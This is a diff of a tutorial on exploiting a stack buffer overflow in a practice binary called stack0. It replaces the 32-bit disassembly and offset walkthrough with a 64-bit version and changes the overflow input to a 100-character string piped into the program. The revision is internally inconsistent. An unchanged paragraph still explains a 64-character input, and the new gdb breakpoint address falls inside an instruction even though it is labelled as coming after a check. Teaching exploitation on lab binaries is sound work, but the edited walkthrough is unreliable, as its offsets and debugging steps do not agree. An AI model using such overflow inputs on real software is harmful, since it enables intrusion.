@@ -274,29 +274,25 @@ Here are some of the most important registers you’ll encounter:
 
 Now, let’s take a look at the `main` function in `stack0`:
 
-TODO: Check this is correct
-
 ```
 (gdb) disassemble *main
-0x080483f4 <main+0>:  push   ebp
-0x080483f5 <main+1>:  mov    ebp,esp
-0x080483f7 <main+3>:  and    esp,0xfffffff0           //done for aligment
-0x080483fa <main+6>:  sub    esp,0x60                 //making space
-0x080483fd <main+9>:  mov    DWORD PTR [esp+0x5c],0x0 //initialize 'unsecured'
-0x08048405 <main+17>: lea    eax,[esp+0x1c]           //load addr of buffer
-0x08048409 <main+21>: mov    DWORD PTR [esp],eax      //set up the params
-0x0804840c <main+24>: call   0x804830c <gets@plt>     //our call to gets
-0x08048411 <main+29>: mov    eax,DWORD PTR [esp+0x5c]
-0x08048415 <main+33>: test   eax,eax
-0x08048417 <main+35>: je     0x8048427 <main+51>
-0x08048419 <main+37>: mov    DWORD PTR [esp],0x8048500
-0x08048420 <main+44>: call   0x804832c <puts@plt>
-0x08048425 <main+49>: jmp    0x8048433 <main+63>
-0x08048427 <main+51>: mov    DWORD PTR [esp],0x8048529
-0x0804842e <main+58>: call   0x804832c <puts@plt>
-0x08048433 <main+63>: leave
-0x08048434 <main+64>: ret
-
+0x75a <+0>:     push   rbp
+0x75b <+1>:     mov    rbp,rsp
+0x75e <+4>:     add    rsp,0xffffffffffffff80 // Allocating 128 bytes on stack
+0x762 <+8>:     mov    DWORD PTR [rbp-0x74],edi
+0x765 <+11>:    mov    QWORD PTR [rbp-0x80],rsi
+0x769 <+15>:    mov    DWORD PTR [rbp-0xc],0x0 // Initialize 'unsecured' flag to 0
+0x770 <+22>:    lea    rax,[rbp-0x70]         // Load address of buffer
+0x774 <+26>:    mov    rdi,rax                // Set up parameter for gets()
+0x777 <+29>:    mov    eax,0x0
+0x77c <+34>:    call   0x620 <gets@plt>       // Vulnerable call to gets() - no bounds checking
+0x781 <+39>:    lea    rsi,[rip+0x100]
+0x788 <+46>:    lea    rdi,[rip+0xfb]
+0x78f <+53>:    call   0x630 <fopen@plt>
+0x794 <+58>:    mov    QWORD PTR [rbp-0x8],rax
+0x798 <+62>:    mov    eax,DWORD PTR [rbp-0xc] // Load 'unsecured' value
+0x79b <+65>:    test   eax,eax                // Check if 'unsecured' is 0
+0x79d <+67>:    je     0x7e6 <main+140>       // Jump if 'unsecured' is still 0
 ```
 
 In this output:
@@ -308,33 +304,33 @@ In this output:
 
 It’s important to note that the assembly mnemonics shown here are not what’s stored in memory. Instead, the mnemonics are human-readable versions of the binary machine code, made visible by using a disassembler like `gdb`.
 
-Our goal is to determine where `unsecured` and `buffer` are relative to each other in memory. To do this, we need to figure out their positions relative to the stack pointer register, `esp`.
+Our goal is still to determine where `unsecured` and `buffer` are relative to each other in memory, but now we need to look at their positions relative to the base pointer register, `rbp`.
 
-We can identify the memory location of the `unsecured` variable by finding the instructions that correspond to the C code `unsecured = 0;` and `if(unsecured != 0)`. In this simple disassembly, the `mov DWORD PTR [esp+0x5c],0x0` instruction at address `0x080483fd` initializes `unsecured`, and the sequence of `mov`, `test`, and `je` instructions starting at `0x08048411` checks its value. This tells us that `unsecured` is located at `esp + 0x5c`.
+We can identify the memory location of the `unsecured` variable by finding the instructions that correspond to the C code `unsecured = 0;` and `if(unsecured != 0)`. In this disassembly, the `mov DWORD PTR [rbp-0xc],0x0` instruction at address `0x769` initializes `unsecured`, and the sequence of `mov`, `test`, and `je` instructions starting at `0x798` checks its value. This tells us that `unsecured` is located at `rbp - 0xc`.
 
-Similarly, we can find the location of `buffer` by looking for the call to `gets()` that uses `buffer` as an argument. Here, we rely on our knowledge of the 32-bit x86 **calling convention**, which dictates that function arguments are passed via the stack. In the disassembly above, the `call` instruction targeting `gets()` at `<main+24>` shows that `esp + 0x1c` is the start of `buffer` because that address is passed to `gets()` via the `eax` register.
+Similarly, we can find the location of `buffer` by looking for the call to `gets()`. In the disassembly, the instruction at `0x770` loads the address `rbp-0x70` into `rax`, which is then passed to `gets()` via the `rdi` register (following the x86-64 **calling convention**). This tells us that `buffer` is located at `rbp - 0x70`.
 
 Keep in mind that compiler optimizations can sometimes result in disassembly that looks very different from the original source code. The compiler might rearrange or even eliminate certain instructions to improve performance.
 
-Now that we suspect `unsecured` is at `esp+0x5c` and `buffer` is at `esp+0x1c`, we can calculate the relative positions of `unsecured` and `buffer` in memory. A quick subtraction (`0x5c - 0x1c`) shows that the start of `buffer` and the start of `unsecured` are 64 bytes apart. To avoid overwriting other important stack values (more on this later), let’s modify our exploit string so it only overflows into `unsecured` and not any further:
+Now that we know `unsecured` is at `rbp-0xc` and `buffer` is at `rbp-0x70`, we can calculate the relative positions. A quick calculation (`0x70 - 0xc`) shows that the start of `buffer` and the start of `unsecured` are 100 (0x64) bytes apart, instead of 64 bytes in the original version.
+
+To exploit this, we'd need to modify our overflow string:
 
 ```bash
-python3 -c "print('a'*64);" | stack0
+python3 -c "print('a'*100);" | stack0
 ```
 
 You might wonder if this code produces a string long enough to overwrite `unsecured` given that it only writes 64 'a' characters. It does! This input will overwrite the first byte of `unsecured` because the Python code `print('a'*64)` produces a 65-character string---64 `a` characters followed by a newline character (`0x0a`), which is automatically added by `print`. The newline character is what overwrites `unsecured`. Let’s use `gdb` to see the impact of this input on a running process:
 
 ```bash
-$ python -c "print('a'*64)" > input.txt
+$ python -c "print('a'*100)" > input.txt
 
 $ gdb stack0
 disass main // view the disassembly for the main function
-break *0x08048411 // put a breakpoint right after the call to gets()
+break *0x79e // put a breakpoint right after the check of unsecured
 r < input.txt // run the binary with the long input
-x/s $esp+0x1c // to see the input string in stack memory
-x/68bx $esp+0x1c // to see input string bytes in hex
-//Warning, everything is flipped! higher addresses are lower
-//The 0x0a000000 right after the 'aaaa' is the memory for `unsecured`
+x/s $rbp-0x70 // to see the input string in stack memory
+x/104bx $rbp-0x70 // to see input string bytes in hex
 ```
 
 In this output, we see a series of commands that we used to interact with the program during debugging. Let’s break down what each of these commands does:
